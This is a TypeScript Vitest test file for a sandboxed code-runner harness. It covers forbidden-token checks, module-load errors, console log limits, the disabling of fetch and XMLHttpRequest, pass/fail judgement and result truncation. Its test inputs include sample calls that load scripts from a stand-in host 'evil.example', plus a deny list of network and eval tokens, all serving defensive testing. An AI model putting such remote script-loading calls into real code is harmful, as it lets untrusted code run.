import { describe, expect, it, vi } from "vitest";
import type { RunRequest, RunResult } from "@/lib/contracts/runner";
import {
  MAX_LOG_ENTRIES,
  MAX_RESULT_BYTES,
  checkForbiddenTokens,
  loadModuleFromCode,
  runHarness,
  truncateResult,
} from "@/lib/runner/harness.worker";

function byteLength(value: unknown): number {
  return new TextEncoder().encode(JSON.stringify(value)).length;
}

function baseRequest(overrides: Partial<RunRequest> = {}): RunRequest {
  return {
    code: "export function f() { return 1; }",
    entry: "f",
    tests: [],
    timeoutMs: 3000,
    ...overrides,
  };
}

describe("checkForbiddenTokens", () => {
  it.each([
    ["importScripts", 'importScripts("https://evil.example/x.js");'],
    ["fetch", 'fetch("https://evil.example");'],
    ["XMLHttpRequest", "const x = new XMLHttpRequest();"],
    ["Atomics.wait", "Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0);"],
    ["eval", 'eval("1 + 1");'],
    ["new Function", 'const f = new Function("return 1");'],
  ])("detects forbidden token: %s", (token, code) => {
    expect(checkForbiddenTokens(code)).toContain(token);
  });

  it("does not flag benign code containing similar-looking identifiers", () => {
    expect(
      checkForbiddenTokens(
        "export function prefetchData() { return 'evaluated'; } // new Functional style",
      ),
    ).toBeNull();
  });
});

describe("runHarness: 禁止トークン", () => {
  it("returns an error result and never loads the module when a forbidden token is present", async () => {
    const loadModule = vi.fn();
    const result = await runHarness(
      baseRequest({ code: 'fetch("https://evil.example"); export function f() { return 1; }' }),
      { loadModule },
    );

    expect(result.result).toBe("error");
    if (result.result === "error") {
      expect(result.error).toContain("fetch");
    }
    expect(loadModule).not.toHaveBeenCalled();
  });
});

describe("runHarness: import失敗時のerror返送", () => {
  it("returns an error result when the module loader rejects", async () => {
    const result = await runHarness(baseRequest(), {
      loadModule: async () => {
        throw new Error("boom");
      },
    });

    expect(result.result).toBe("error");
    if (result.result === "error") {
      expect(result.error).toContain("boom");
    }
  });

  it("returns an error result when the entry export is not a function", async () => {
    const result = await runHarness(baseRequest({ entry: "missing" }), {
      loadModule: async () => ({ f: 1 }),
    });

    expect(result.result).toBe("error");
    if (result.result === "error") {
      expect(result.error).toContain("missing");
    }
  });

  it("rejects for real (Blob URL loader) on syntactically invalid code", async () => {
    await expect(loadModuleFromCode("export function (( invalid")).rejects.toBeTruthy();
  });
});

describe("runHarness: console上限", () => {
  it("caps captured console logs at MAX_LOG_ENTRIES even when user code logs more", async () => {
    const result = await runHarness(
      baseRequest({ tests: [{ id: "t1", args: [], expected: 42 }] }),
      {
        loadModule: async () => ({
          f: () => {
            for (let i = 0; i < MAX_LOG_ENTRIES + 300; i++) {
              console.log("line", i);
            }
            return 42;
          },
        }),
      },
    );

    expect(result.result).toBe("pass");
    expect(result.logs).toHaveLength(MAX_LOG_ENTRIES);
  });

  it("does not leak console overrides to the surrounding test process", async () => {
    const originalLog = console.log;
    await runHarness(baseRequest(), {
      loadModule: async () => ({
        f: () => {
          console.log("inside sandbox");
          return 1;
        },
      }),
    });
    expect(console.log).toBe(originalLog);
  });
});

describe("runHarness: 危険なグローバルの無効化", () => {
  it("disables fetch/XMLHttpRequest while user code runs, and restores them afterward", async () => {
    const originalFetch = globalThis.fetch;
    const result = await runHarness(
      baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }),
      {
        loadModule: async () => ({
          f: () => typeof fetch === "undefined" && typeof XMLHttpRequest === "undefined",
        }),
      },
    );

    expect(result.result).toBe("pass");
    expect(globalThis.fetch).toBe(originalFetch);
  });
});

describe("runHarness: pass/fail 判定", () => {
  it("reports pass when all tests match and fail when any mismatch", async () => {
    const loadModule = async () => ({ f: (n: number) => n * 2 });

    const passing = await runHarness(
      baseRequest({ entry: "f", tests: [{ id: "t1", args: [2], expected: 4 }] }),
      { loadModule },
    );
    expect(passing.result).toBe("pass");

    const failing = await runHarness(
      baseRequest({ entry: "f", tests: [{ id: "t1", args: [2], expected: 5 }] }),
      { loadModule },
    );
    expect(failing.result).toBe("fail");
  });
});

describe("truncateResult: 結果サイズ上限", () => {
  it("returns the result unchanged when within the size limit", () => {
    const result: RunResult = {
      result: "pass",
      perTest: [{ id: "t1", pass: true, actual: "1" }],
      logs: [],
      durationMs: 1,
    };
    expect(truncateResult(result)).toEqual(result);
  });

  it("truncates oversized pass/fail results and sets the truncated flag", () => {
    const result: RunResult = {
      result: "pass",
      perTest: Array.from({ length: 20 }, (_, i) => ({
        id: `t${i}`,
        pass: true,
        actual: "x".repeat(100_000),
      })),
      logs: Array.from({ length: MAX_LOG_ENTRIES }, () => ({
        level: "log" as const,
        args: ["x".repeat(20_000)],
      })),
      durationMs: 1,
    };

    const truncated = truncateResult(result);
    expect(byteLength(truncated)).toBeLessThanOrEqual(MAX_RESULT_BYTES);
    expect(truncated.result).toBe("pass");
    if (truncated.result === "pass" || truncated.result === "fail") {
      expect(truncated.truncated).toBe(true);
    }
  });

  it("truncates oversized error/timeout results without adding a truncated field they don't support", () => {
    const result: RunResult = {
      result: "error",
      error: "boom",
      logs: Array.from({ length: MAX_LOG_ENTRIES }, () => ({
        level: "log" as const,
        args: ["x".repeat(20_000)],
      })),
      durationMs: 1,
    };

    const truncated = truncateResult(result);
    expect(byteLength(truncated)).toBeLessThanOrEqual(MAX_RESULT_BYTES);
    expect(truncated.result).toBe("error");
  });

  it("clamps an oversized error message itself, not just logs", () => {
    const result: RunResult = {
      result: "error",
      error: "x".repeat(2_000_000),
      logs: [],
      durationMs: 1,
    };

    const truncated = truncateResult(result);
    expect(byteLength(truncated)).toBeLessThanOrEqual(MAX_RESULT_BYTES);
    expect(truncated.result).toBe("error");
  });

  it("end-to-end: runHarness truncates a huge error message thrown during module load", async () => {
    const bigMessage = "x".repeat(2_000_000);
    const result = await runHarness(baseRequest(), {
      loadModule: async () => {
        throw new Error(bigMessage);
      },
    });

    expect(result.result).toBe("error");
    expect(byteLength(result)).toBeLessThanOrEqual(MAX_RESULT_BYTES);
  });

  it("end-to-end: runHarness truncates a huge actual value produced by user code", async () => {
    const bigString = "x".repeat(2_000_000);
    const result = await runHarness(
      baseRequest({ entry: "f", tests: [{ id: "t1", args: [], expected: "not-equal" }] }),
      { loadModule: async () => ({ f: () => bigString }) },
    );

    expect(byteLength(result)).toBeLessThanOrEqual(MAX_RESULT_BYTES);
    expect(result.result).toBe("fail");
    if (result.result === "pass" || result.result === "fail") {
      expect(result.truncated).toBe(true);
    }
  });
});
